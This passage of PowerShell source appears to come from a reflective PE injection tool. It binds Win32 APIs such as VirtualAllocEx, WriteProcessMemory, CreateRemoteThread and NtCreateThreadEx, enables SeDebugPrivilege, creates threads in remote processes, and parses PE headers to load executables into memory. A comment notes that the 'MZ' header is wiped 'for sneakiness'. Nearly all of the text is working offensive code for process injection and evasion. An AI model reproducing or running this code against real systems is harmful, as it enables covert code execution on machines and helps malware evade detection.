		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
	
		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
